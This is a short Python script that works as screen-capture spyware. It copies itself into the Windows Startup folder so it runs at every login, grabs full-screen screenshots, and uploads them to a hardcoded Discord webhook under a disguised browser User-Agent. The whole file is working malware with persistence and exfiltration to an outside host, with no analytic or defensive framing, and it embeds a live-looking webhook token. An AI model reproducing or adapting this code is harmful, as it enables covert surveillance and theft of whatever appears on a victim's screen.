import datetime
import requests
from PIL import ImageGrab
import shutil
import os

filename = f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"

image = ImageGrab.grab()
image.save(filename)

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startup_filepath = os.path.join(startup_folder, "./copy.py")

if not os.path.exists(startup_filepath):
    shutil.copy("./copy.py", startup_folder)

image = ImageGrab.grab()

image.save(filename)

with open(filename, "rb") as f:
    image_data = f.read()

filepath = [filename]

files = {'file': open(filepath[0], 'rb')}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache, no-store',
    'If-Modified-Since': 'Sat, 1 Jan 2000 00:00:00 GMT',
}

url = "https://discord.com/api/webhooks/1209134934728642570/tZYH1xpsOjo817tV6oOHYhmHoBKvF_lGFJ35M7s6rHu4mB-Ejk8CEe5R9Weuy-D2zYCk"

response = requests.post(url, headers=headers, files=files)
print(response.text)
